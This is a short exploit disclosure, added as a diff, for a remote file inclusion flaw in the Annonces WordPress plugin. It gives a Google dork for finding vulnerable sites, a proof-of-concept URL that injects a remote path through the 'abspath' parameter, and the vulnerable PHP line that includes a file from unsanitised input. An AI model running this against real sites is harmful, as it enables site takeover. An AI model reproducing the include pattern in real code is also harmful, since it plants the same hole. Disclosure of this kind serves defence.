@@ -1,0 +1,16 @@
+# Exploit Title: Annonces Wordpress plugin RFI
+# Google Dork: inurl:wp-content/plugins/annonces
+# Date: 09/19/2011
+# Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+# Software Link: http://wordpress.org/extend/plugins/annonces/download/
+# Version: 1.2.0.0 (tested)
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/annonces/includes/lib/photo/uploadPhoto.php?abspath=RFI
+
+---
+Vulnerable Code
+---
+require_once($_GET['abspath'] . 'wp-load.php');
